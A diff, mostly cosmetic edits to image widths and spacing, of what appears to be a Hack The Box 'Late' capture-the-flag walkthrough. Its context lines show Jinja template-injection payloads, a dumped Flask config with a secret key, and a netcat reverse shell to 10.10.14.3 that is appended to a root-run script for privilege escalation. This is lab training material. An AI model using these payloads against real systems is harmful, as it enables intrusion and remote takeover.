@@ -64,7 +64,7 @@ We add the hostname into the /etc/hosts file and using that URL, we reach the to
 I used the following image to see what the server is doing with the OCR output:
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/late/test.png" width="30%"/>
+  <img src="/images/walkthroughs/hackthebox/late/test.png" width="10%"/>
 </p>
 
 Output:
@@ -137,9 +137,7 @@ There was many tries and payloads...
 ```python
 { {''.class.mro()[1].subclasses()} }
 
-
 { { "".class.mro()[1].subclasses()} }
-
 
 # Working with some bypasses:
 
@@ -176,7 +174,7 @@ Some responses from previous payloads:
 I tried to get some extra information with working paylaods:
 
 ```python
-{{ config }}
+{ { config } }
 
 <p>&lt;Config {&#39;ENV&#39;: &#39;production&#39;, &#39;DEBUG&#39;: False, &#39;TESTING&#39;: False, &#39;PROPAGATE_EXCEPTIONS&#39;: None, &#39;PRESERVE_CONTEXT_ON_EXCEPTION&#39;: None, &#39;SECRET_KEY&#39;: b&#39;_5#y2L&#34;F4Q8z\n\xec]/&#39;, &#39;PERMANENT_SESSION_LIFETIME&#39;: datetime.timedelta(31), &#39;USE_X_SENDFILE&#39;: False, &#39;SERVER_NAME&#39;: None, &#39;APPLICATION_ROOT&#39;: &#39;/&#39;, &#39;SESSION_COOKIE_NAME&#39;: &#39;session&#39;, &#39;SESSION_COOKIE_DOMAIN&#39;: False, &#39;SESSION_COOKIE_PATH&#39;: None, &#39;SESSION_COOKIE_HTTPONLY&#39;: True, &#39;SESSION_COOKIE_SECURE&#39;: False, &#39;SESSION_COOKIE_SAMESITE&#39;: None, &#39;SESSION_REFRESH_EACH_REQUEST&#39;: True, &#39;MAX_CONTENT_LENGTH&#39;: None, &#39;SEND_FILE_MAX_AGE_DEFAULT&#39;: None, &#39;TRAP_BAD_REQUEST_ERRORS&#39;: None, &#39;TRAP_HTTP_EXCEPTIONS&#39;: False, &#39;EXPLAIN_TEMPLATE_LOADING&#39;: False, &#39;PREFERRED_URL_SCHEME&#39;: &#39;http&#39;, &#39;JSON_AS_ASCII&#39;: True, &#39;JSON_SORT_KEYS&#39;: True, &#39;JSONIFY_PRETTYPRINT_REGULAR&#39;: False, &#39;JSONIFY_MIMETYPE&#39;: &#39;application/json&#39;, &#39;TEMPLATES_AUTO_RELOAD&#39;: None, &#39;MAX_COOKIE_SIZE&#39;: 4093}&gt;
 </p>
@@ -313,7 +311,7 @@ And the final payload to get the reverse shell:
 ```
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/late/4_4_rev.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/late/4_4_rev.jpg" width="90%"/>
 </p>
 
 And it worked:
@@ -339,7 +337,7 @@ CMD: UID=0    PID=2323   | chattr +a /usr/local/sbin/ssh-alert.sh
 ```
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/late/6_0_pspy64.png" width="70%"/>
+  <img src="/images/walkthroughs/hackthebox/late/6_0_pspy64.png" width="65%"/>
 </p>
 
 That script is owned by us, therefore, an edit with a rev shell at the end should do the job:
@@ -373,13 +371,13 @@ mkfifo /tmp/f; nc 10.10.14.3 5455 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
 When saving in nano it shows _[ Error writing /usr/local/sbin/ssh-alert.sh: Operation not permitted ]_
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/late/6_1_not_write.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/late/6_1_not_write.png" width="80%"/>
 </p>
 
 Checking the other attributes, we can see that we have append permission, so lets append to the file:
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/late/6_2_apped.png" width="60%"/>
+  <img src="/images/walkthroughs/hackthebox/late/6_2_apped.png" width="50%"/>
 </p>
 
 ```bash
@@ -389,7 +387,7 @@ echo "mkfifo /tmp/f; nc 10.10.14.3 5455 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp
 We iniciate a SSH into svc_acc user and we get the shell in our host.
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/late/7_0_root.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/late/7_0_root.png" width="70%"/>
 </p>
 
 ``` 7aa38494fb2a4439e9f2b73c055e00d1 ```
